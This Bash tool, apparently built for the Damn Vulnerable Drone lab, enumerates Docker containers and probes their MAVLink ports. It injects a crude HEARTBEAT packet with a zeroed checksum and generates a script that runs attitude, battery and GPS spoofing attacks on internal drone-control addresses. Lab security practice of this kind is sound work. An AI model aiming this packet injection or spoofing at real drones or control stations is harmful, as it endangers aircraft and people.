#!/bin/bash
# dvd_deep_monitor.sh - DVD 컨테이너 내부 상세 분석 및 실시간 모니터링

source "$(dirname "$0")/common/colors.sh"
source "$(dirname "$0")/common/utils.sh"

print_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}      DVD Deep Container Monitor           ${NC}"
    echo -e "${CYAN}============================================${NC}"
}

analyze_container_internals() {
    echo -e "${YELLOW}[*] Analyzing DVD container internals...${NC}"
    
    local containers=("flight-controller" "companion-computer" "simulator" "ground-control-station")
    
    for container in "${containers[@]}"; do
        if docker ps --format "{{.Names}}" | grep -q "^${container}$"; then
            echo -e "${BLUE}=== $container Analysis ===${NC}"
            
            # 네트워크 인터페이스 확인
            echo -e "${CYAN}Network Interfaces:${NC}"
            docker exec "$container" ip addr show 2>/dev/null | grep -E "inet|eth|wlan" | head -10
            
            echo -e "${CYAN}Listening Ports:${NC}"
            docker exec "$container" netstat -tulpn 2>/dev/null | grep LISTEN | head -10
            
            echo -e "${CYAN}Running Processes:${NC}"
            docker exec "$container" ps aux 2>/dev/null | grep -E "(mavlink|ardupilot|sitl|mavproxy|gazebo)" | head -5
            
            # MAVLink 관련 파일 찾기
            echo -e "${CYAN}MAVLink Related Files:${NC}"
            docker exec "$container" find / -name "*mavlink*" -o -name "*ardupilot*" -o -name "*sitl*" 2>/dev/null | head -5
            
            # 설정 파일 확인
            echo -e "${CYAN}Configuration Files:${NC}"
            docker exec "$container" find /etc /opt /root -name "*.conf" -o -name "*.cfg" -o -name "*.yaml" -o -name "*.yml" 2>/dev/null | grep -v proc | head -5
            
            echo ""
        else
            echo -e "${RED}[!] Container $container not found${NC}"
        fi
    done
}

find_mavlink_connections() {
    echo -e "${YELLOW}[*] Searching for MAVLink connections...${NC}"
    
    local containers=("flight-controller" "companion-computer" "ground-control-station")
    
    for container in "${containers[@]}"; do
        if docker ps --format "{{.Names}}" | grep -q "^${container}$"; then
            echo -e "${BLUE}=== $container MAVLink Search ===${NC}"
            
            # 활성 네트워크 연결 확인
            echo -e "${CYAN}Active Network Connections:${NC}"
            docker exec "$container" netstat -an 2>/dev/null | grep -E ":5760|:14550|:14551|ESTABLISHED" | head -10
            
            # 환경 변수에서 MAVLink 관련 찾기
            echo -e "${CYAN}MAVLink Environment Variables:${NC}"
            docker exec "$container" env 2>/dev/null | grep -i -E "(mav|sitl|port|udp|tcp)" | head -5
            
            # 실행 중인 명령어 확인
            echo -e "${CYAN}Running Commands with Args:${NC}"
            docker exec "$container" ps -ef 2>/dev/null | grep -E "(mavlink|sitl|ardupilot|mavproxy)" | head -3
            
            echo ""
        fi
    done
}

monitor_container_logs() {
    local duration=${1:-30}
    echo -e "${YELLOW}[*] Real-time log monitoring for ${duration} seconds...${NC}"
    
    # 각 컨테이너의 로그를 백그라운드에서 모니터링
    docker logs -f --tail=10 flight-controller 2>/dev/null | sed 's/^/[FC] /' &
    local fc_pid=$!
    
    docker logs -f --tail=10 companion-computer 2>/dev/null | sed 's/^/[CC] /' &
    local cc_pid=$!
    
    docker logs -f --tail=10 simulator 2>/dev/null | sed 's/^/[SIM] /' &
    local sim_pid=$!
    
    docker logs -f --tail=10 ground-control-station 2>/dev/null | sed 's/^/[GCS] /' &
    local gcs_pid=$!
    
    # 지정된 시간 동안 대기
    echo -e "${GREEN}Monitoring logs... Press Ctrl+C to stop early${NC}"
    sleep "$duration"
    
    # 백그라운드 프로세스 종료
    kill $fc_pid $cc_pid $sim_pid $gcs_pid 2>/dev/null
    wait 2>/dev/null
    
    echo -e "${GREEN}[✓] Log monitoring completed${NC}"
}

check_container_networks() {
    echo -e "${YELLOW}[*] Checking container network details...${NC}"
    
    # Docker 네트워크 정보
    local network_info=$(docker network ls | grep -v NETWORK)
    echo -e "${CYAN}Available Docker Networks:${NC}"
    echo "$network_info"
    echo ""
    
    # 각 컨테이너의 네트워크 설정
    local containers=($(docker ps --format "{{.Names}}" | grep -E "(flight-controller|companion|simulator|ground)"))
    
    for container in "${containers[@]}"; do
        echo -e "${BLUE}=== $container Network Details ===${NC}"
        
        # IP 주소 정보
        local ip_info=$(docker inspect "$container" 2>/dev/null | grep -A 10 "NetworkSettings" | grep -E "IPAddress|Gateway|Bridge")
        if [ -n "$ip_info" ]; then
            echo "$ip_info"
        fi
        
        # 포트 매핑 정보
        local port_info=$(docker port "$container" 2>/dev/null)
        if [ -n "$port_info" ]; then
            echo -e "${CYAN}Port Mappings:${NC}"
            echo "$port_info"
        fi
        
        echo ""
    done
}

test_real_mavlink_ports() {
    echo -e "${YELLOW}[*] Testing real MAVLink ports with packet injection...${NC}"
    
    # DVD 환경의 실제 IP들 (컨테이너 내부에서 확인된)
    local test_targets=(
        "flight-controller:5760"
        "flight-controller:14550"
        "10.13.0.2:5760"
        "10.13.0.2:14550"
        "10.13.0.3:5760"
        "10.13.0.3:14550"
        "10.13.0.4:5760"
        "10.13.0.4:14550"
    )
    
    for target in "${test_targets[@]}"; do
        local host=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        echo -e "${CYAN}Testing $target...${NC}"
        
        # 네트워크 연결 테스트
        if timeout 3 nc -z "$host" "$port" 2>/dev/null; then
            echo -e "${GREEN}  [✓] Port $target is reachable${NC}"
            
            # 실제 MAVLink 패킷 전송 테스트
            test_mavlink_packet "$host" "$port"
        else
            echo -e "${RED}  [✗] Port $target is not reachable${NC}"
        fi
    done
}

test_mavlink_packet() {
    local host="$1"
    local port="$2"
    
    python3 << PYEOF 2>/dev/null
import socket
import struct
import time

def send_test_packet(host, port):
    try:
        # 간단한 MAVLink HEARTBEAT 패킷 생성
        packet = bytearray([
            0xFE,  # start marker
            0x09,  # payload length
            0x00,  # packet sequence
            0x01,  # system ID
            0x01,  # component ID
            0x00,  # message ID (HEARTBEAT)
            # payload (9 bytes for heartbeat)
            0x06, 0x00, 0x00, 0x00,  # type
            0x03,  # autopilot
            0x00,  # base_mode
            0x00, 0x00, 0x00, 0x00,  # custom_mode
            0x03,  # system_status
            0x03   # mavlink_version
        ])
        
        # CRC 추가 (간단화)
        packet.extend([0x00, 0x00])
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        
        sock.sendto(packet, (host, int(port)))
        print(f"    → MAVLink test packet sent to {host}:{port}")
        
        try:
            response, addr = sock.recvfrom(1024)
            print(f"    ✓ Response received ({len(response)} bytes) - VALID MAVLink PORT!")
            return True
        except socket.timeout:
            print(f"    - No response (may still be valid)")
            return False
        finally:
            sock.close()
            
    except Exception as e:
        print(f"    ✗ Test failed: {e}")
        return False

send_test_packet("$host", "$port")
PYEOF
}

generate_attack_script() {
    echo -e "${YELLOW}[*] Generating optimized attack script...${NC}"
    
    cat > "dvd_optimized_attack.sh" << 'SCRIPT_EOF'
#!/bin/bash
# DVD Optimized Attack Script - Based on container analysis

# 실제 DVD 환경에서 동작하는 타겟들
TARGETS=(
    "10.13.0.2:5760"    # Flight Controller SITL
    "10.13.0.3:5760"    # Companion Computer
    "10.13.0.4:5760"    # Ground Control Station
)

# 공격 실행
for target in "${TARGETS[@]}"; do
    ip=$(echo "$target" | cut -d':' -f1)
    port=$(echo "$target" | cut -d':' -f2)
    
    echo "=== Attacking $target ==="
    
    # Attitude Spoofing
    echo "Running attitude spoofing..."
    timeout 30 sudo ./attitude_spoofing.sh "$ip" "$port" 30 &
    
    # Battery Spoofing  
    echo "Running battery spoofing..."
    timeout 30 sudo ./battery_spoofing.sh "$ip" "$port" 30 &
    
    # GPS Spoofing
    echo "Running GPS spoofing..."
    timeout 30 sudo ./gps_spoofing.sh "$ip" "$port" 30 &
    
    wait
    echo "Attack on $target completed"
    echo ""
done

echo "All attacks completed!"
SCRIPT_EOF
    
    chmod +x "dvd_optimized_attack.sh"
    echo -e "${GREEN}[✓] Created dvd_optimized_attack.sh${NC}"
}

main() {
    print_banner
    
    case "${1:-all}" in
        "analyze")
            analyze_container_internals
            ;;
        "mavlink")
            find_mavlink_connections
            ;;
        "network")
            check_container_networks
            ;;
        "test")
            test_real_mavlink_ports
            ;;
        "monitor")
            monitor_container_logs "${2:-30}"
            ;;
        "generate")
            generate_attack_script
            ;;
        "all")
            analyze_container_internals
            echo ""
            find_mavlink_connections
            echo ""
            check_container_networks
            echo ""
            test_real_mavlink_ports
            echo ""
            generate_attack_script
            ;;
        *)
            echo "Usage: $0 [analyze|mavlink|network|test|monitor|generate|all]"
            echo ""
            echo "  analyze  - Analyze container internals"
            echo "  mavlink  - Find MAVLink connections"
            echo "  network  - Check network configuration"
            echo "  test     - Test MAVLink ports"
            echo "  monitor  - Real-time log monitoring"
            echo "  generate - Generate optimized attack script"
            echo "  all      - Run all analysis (default)"
            ;;
    esac
}

main "$@"